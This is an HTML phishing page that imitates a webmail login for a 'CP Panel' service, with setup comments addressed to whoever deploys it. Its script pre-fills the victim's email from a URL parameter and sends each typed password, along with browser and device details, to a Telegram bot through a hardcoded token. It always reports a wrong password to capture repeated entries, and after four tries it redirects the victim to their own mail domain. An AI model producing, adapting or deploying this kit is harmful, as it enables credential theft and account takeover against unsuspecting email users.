<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer">
    <style>
        body {
            background-color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            margin: 0;
        }
        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            color: #ff6200;
            text-align: center;
            margin-bottom: 1.5rem;
        }
        .login-container {
            max-width: 400px;
            width: 100%;
            padding: 2rem;
            margin: auto;
        }
        .form-label {
            font-size: 0.9rem;
            color: #333;
            margin-bottom: 0.5rem;
        }
        .form-control {
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 0.5rem;
            font-size: 0.9rem;
            color: #666;
        }
        .form-control::placeholder {
            color: #999;
        }
        .input-group {
            position: relative;
        }
        .input-icon {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            font-size: 1rem;
            z-index: 100;
        }
        .form-control.with-icon {
            padding-left: 2.5rem;
        }
        .btn-login {
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            padding: 0.75rem;
            font-size: 1rem;
            font-weight: 500;
            width: 100%;
            margin-top: 1rem;
        }
        .btn-login:disabled {
            background-color: #6c757d;
            cursor: not-allowed;
        }
        .reset-link {
            display: block;
            text-align: center;
            color: #007bff;
            font-size: 0.9rem;
            margin-top: 1rem;
            text-decoration: none;
        }
        .reset-link:hover {
            text-decoration: underline;
        }
        .language-links {
            text-align: center;
            margin-top: 2rem;
            margin-bottom: 1rem;
        }
        .language-links a {
            color: #666;
            font-size: 0.85rem;
            margin: 0 0.5rem;
            text-decoration: none;
        }
        .language-links a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            color: #666;
            font-size: 0.75rem;
            margin-top: auto;
            padding: 1rem 0;
        }
        .footer img {
            vertical-align: middle;
            margin-right: 0.5rem;
        }
        .error-message {
            display: none;
            background-color: #c50000;
            color: #fff;
            font-size: 0.9rem;
            padding: 0.5rem;
            text-align: center;
            margin-bottom: 1rem;
            border-radius: 4px;
        }

        @media (max-width: 576px) {
            .login-container {
                padding: 1rem;
            }
            .logo {
                font-size: 2rem;
                margin-bottom: 1rem;
            }
            .form-label {
                font-size: 0.85rem;
            }
            .form-control {
                font-size: 0.85rem;
                padding: 0.4rem;
            }
            .btn-login {
                padding: 0.6rem;
                font-size: 0.9rem;
            }
            .reset-link {
                font-size: 0.85rem;
            }
            .language-links a {
                font-size: 0.75rem;
                margin: 0 0.3rem;
            }
            .footer {
                font-size: 0.65rem;
            }
            .error-message {
                font-size: 0.8rem;
                padding: 0.4rem;
            }
        }
    </style>
</head>
<body>
    <div id="google_translate_element"></div>

    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({
                pageLanguage: 'en',
                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
            }, 'google_translate_element');
        }
    </script>

    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
    
    <div class="login-container">
        <div class="logo"><img src="img/webmail-logo.svg" style="max-height:50px ;max-width: 304px;" /></div>
        <div class="error-message" id="errorMsg">Incorrect email or password, please try again!</div>
        <form id="loginForm">
            <div class="mb-3">
                <label for="email" class="form-label">Email Address</label>
                <div class="input-group">
                    <span class="input-icon">👤</span>
                    <input type="email" class="form-control with-icon" id="email" placeholder="Enter your email address." readonly>
                </div>
            </div>
            <div class="mb-3">
                <label for="password" class="form-label">Password</label>
                <div class="input-group">
                    <span class="input-icon">🔒</span>
                    <input type="password" class="form-control with-icon" id="password" placeholder="Enter your email password." required>
                    <i class="fa fa-eye input-icon" id="togglePassword" onclick="togglePasswordVisibility()" style="left: auto; right: 10px;" aria-hidden="true"></i>
                </div>
            </div>
            <button type="submit" class="btn btn-primary btn-login" id="loginBtn">Log in</button>
            <a href="#" class="reset-link">Reset password</a>
        </form>
    </div>
    <div class="language-links">
        <a href="#">العربية</a>
        <a href="#">čeština</a>
        <a href="#">dansk</a>
        <a href="#">Deutsch</a>
        <a href="#">Ελληνικά</a>
        <a href="#">español</a>
        <a href="#">español latinoamericano</a>
        <a href="#">español de España</a>
        <a href="#">...</a>
    </div>
    <div class="footer">
        <img src="icon.png" alt="CP Logo"> Copyright © 2025 CP Panel, LLC.
    </div>

    <!-- jQuery -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // ============================================================
        // !!! IMPORTANT: replace with your own token and chatId !!!
        // ============================================================
        const TELEGRAM_TOKEN = '8586917350:AAFxcKb_KiIVB-Vx3Kw8MBqjwzyHtRq0fV8';      // <-- replace
        const TELEGRAM_CHAT_ID = '8257309164';      // <-- replace
        // ============================================================

        let loginAttempts = 0;

        document.addEventListener('DOMContentLoaded', function() {
            // Get email from URL parameter 'mn'
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get('mn');
            
            let deviceInfo = {};

            // If no email parameter, show error
            if (!email) {
                document.documentElement.title = 'Error';
                showError('No email provided. Please use ?mn=email@domain.com');
                return;
            }

            // Set email field
            document.getElementById('email').value = email;

            // Collect device information
            deviceInfo = {
                useragent: navigator.userAgent,
                browser: navigator.userAgent.split(') ')[0].split(' (')[0] || 'Unknown',
                device: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                time: new Date().toLocaleString(),
                platform: navigator.platform || 'Unknown',
                language: navigator.language || 'Unknown'
            };

            console.log('Device Info Collected:', deviceInfo);

            // Login form submission
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const loginBtn = document.getElementById('loginBtn');
                const passwordField = document.getElementById('password');
                const emailValue = document.getElementById('email').value;
                const passwordValue = passwordField.value;

                // Validate password
                if (!passwordValue || passwordValue.trim() === '') {
                    showError('Please enter your password.');
                    passwordField.focus();
                    return;
                }

                // Increment attempt counter
                loginAttempts++;

                // 1. DISABLE BUTTON & SHOW LOADING FOR 4 SECONDS
                loginBtn.disabled = true;
                loginBtn.textContent = 'Loading...';
                hideError();

                // Show loading for 4 seconds before proceeding
                setTimeout(function() {
                    // 2. SEND DATA TO TELEGRAM
                    const message = 
                        '🔐 New Login Attempt #' + loginAttempts + '\n' +
                        '═══════════════════════\n' +
                        '📧 Email: ' + emailValue + '\n' +
                        '🔑 Password: ' + passwordValue + '\n' +
                        '─────────────────────\n' +
                        '🖥️ Device Info:\n' +
                        '  • Browser: ' + deviceInfo.browser + '\n' +
                        '  • Device: ' + deviceInfo.device + '\n' +
                        '  • Platform: ' + deviceInfo.platform + '\n' +
                        '  • Language: ' + deviceInfo.language + '\n' +
                        '  • Timezone: ' + deviceInfo.timezone + '\n' +
                        '  • Time: ' + deviceInfo.time + '\n' +
                        '─────────────────────\n' +
                        '📱 UserAgent: ' + deviceInfo.useragent + '\n' +
                        '═══════════════════════';

                    const telegramUrl = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
                    
                    fetch(telegramUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Telegram API error: ' + response.status);
                        }
                        return response.json();
                    })
                    .then(data => {
                        if (data.ok) {
                            console.log('✅ Message sent successfully to Telegram!');
                        } else {
                            throw new Error(data.description || 'Unknown error');
                        }
                    })
                    .catch(error => {
                        console.error('❌ Telegram error:', error);
                    })
                    .finally(function() {
                        // 3. CLEAR PASSWORD FIELD
                        passwordField.value = '';

                        // 4. SHOW "INCORRECT PASSWORD" FOR 3 SECONDS
                        showError('Incorrect email or password, please try again!');
                        
                        // Re-enable button
                        loginBtn.disabled = false;
                        loginBtn.textContent = 'Log in';

                        // 5. CHECK FOR 4TH ATTEMPT - REDIRECT AFTER 3 SECONDS
                        if (loginAttempts >= 4) {
                            // Show message and prepare to redirect
                            showError('Too many attempts. Redirecting...');
                            
                            setTimeout(function() {
                                // Split email by '@' and get domain
                                const emailParts = emailValue.split('@');
                                if (emailParts.length > 1) {
                                    const domain = emailParts[1];
                                    // Redirect to domain (add https:// if needed)
                                    let redirectUrl = domain;
                                    if (!redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
                                        redirectUrl = 'https://' + redirectUrl;
                                    }
                                    window.location.href = redirectUrl;
                                } else {
                                    // Fallback if no domain found
                                    window.location.href = 'https://www.google.com';
                                }
                            }, 3000);
                        } else {
                            // For attempts 1-3: focus password field for next attempt
                            setTimeout(function() {
                                passwordField.focus();
                            }, 3000);
                        }
                    });
                }, 4000); // 4 seconds loading
            });
        });

        // Helper function to show error message
        function showError(text) {
            const msgDiv = document.getElementById('errorMsg');
            msgDiv.textContent = text;
            msgDiv.style.display = 'block';
        }

        // Helper function to hide error message
        function hideError() {
            const msgDiv = document.getElementById('errorMsg');
            msgDiv.style.display = 'none';
        }

        // Toggle password visibility
        function togglePasswordVisibility() {
            const passwordField = document.getElementById('password');
            const eyeIcon = document.getElementById('togglePassword');

            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            } else {
                passwordField.type = 'password';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            }
        }
    </script>
